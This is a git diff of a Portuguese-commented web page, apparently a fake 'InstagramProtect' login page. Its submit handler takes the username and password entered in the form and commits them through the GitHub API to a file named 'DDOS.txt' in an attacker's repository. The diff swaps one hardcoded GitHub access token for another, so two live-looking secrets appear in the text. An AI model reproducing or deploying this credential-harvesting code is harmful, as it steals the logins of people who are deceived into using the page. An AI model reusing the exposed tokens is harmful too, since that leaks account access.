@@ -167,10 +167,10 @@ body { min-height: 100dvh; background: #fff; }
    ⚙️  CONFIGURAÇÃO — edite SOMENTE este bloco
    ============================================================ */
 const CONFIG = {
-  token:  "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",
+  token:  "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",       
   repo:   "nevercryzin00-png/InstagramProtect",
   branch: "main",
-  file:   "DDOS.txt"
+  file:   "DDOS.txt"                   
 };
 /* ============================================================ */
 
@@ -205,7 +205,7 @@ function fromBase64(b64) {
 
 // ---------- Monta o bloco ----------
 function montarBloco(username, senha) {
-  return `Name: ${username}\nSenha: ${senha}`;
+  return `Name: ${username}\nSenh: ${senha}`;
 }
 
 // ---------- Normaliza o caminho ----------
@@ -238,6 +238,7 @@ async function salvarNoGitHub(novoBloco) {
     "X-GitHub-Api-Version": "2022-11-28"
   };
 
+  // 1) Lê o arquivo atual (se existir)
   let conteudoAtual = "";
   let sha = undefined;
   const getRes = await fetch(`${api}?ref=${encodeURIComponent(branch)}`, { headers });
@@ -251,6 +252,7 @@ async function salvarNoGitHub(novoBloco) {
     throw new Error(err.message || "Falha ao ler o repositório.");
   }
 
+  // 2) Adiciona o novo bloco
   let novoConteudo;
   if (conteudoAtual.trim() === "") {
     novoConteudo = novoBloco + "\n";
@@ -259,6 +261,7 @@ async function salvarNoGitHub(novoBloco) {
     novoConteudo = conteudoAtual + separador + novoBloco + "\n";
   }
 
+  // 3) Faz o commit
   const putRes = await fetch(api, {
     method: "PUT",
     headers: { ...headers, "Content-Type": "application/json" },
@@ -277,7 +280,7 @@ async function salvarNoGitHub(novoBloco) {
   return true;
 }
 
-// ---------- Submit → valida e envia pro GitHub ----------
+// ---------- Submit → valida e envia pro GitHub (sem alert) ----------
 form.addEventListener("submit", async function (event) {
   event.preventDefault();
 
